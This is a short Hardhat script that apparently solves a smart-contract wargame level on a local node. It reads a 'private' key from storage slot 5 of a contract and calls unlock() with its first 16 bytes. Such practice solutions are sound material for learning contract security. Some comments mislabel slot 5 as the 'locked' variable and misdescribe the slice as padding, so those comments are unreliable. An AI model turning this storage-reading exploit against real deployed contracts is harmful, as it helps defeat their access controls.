const { ethers } = require("hardhat");
require("dotenv").config();
const CONTRACT_ADDRESS = "0x2b961E3959b79326A8e7F64Ef0d2d825707669b5";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

const SLOT_INDEX = 5;

async function main() {
  // Create a JsonRpcProvider instance that connects to the local network
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );

  //   Create a wallet instance (for signing transactions)

  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  // Read the value of the "locked" variable (slot 5)
  const value = await provider.getStorageAt(CONTRACT_ADDRESS, SLOT_INDEX);
  console.log(`Value of "locked" variable: ${value}`);

  const contractInterface = [
    "function unlock(bytes16 _key) public",
    "function locked() public view returns (bool)",
  ];
  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    wallet
  );
  const bytes16 = value.slice(0, 34); // extract first 16 bytes and pad with zeros
  // extract first 16 bytes (32 hexadecimal characters)

  console.log(`bytes16: ${bytes16}`);
  //   Call the unlock function
  await contract.unlock(bytes16);

  // Check the locked state after calling the unlock function
  const locked = await contract.locked();
  console.log(`Locked state after unlock: ${locked}`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
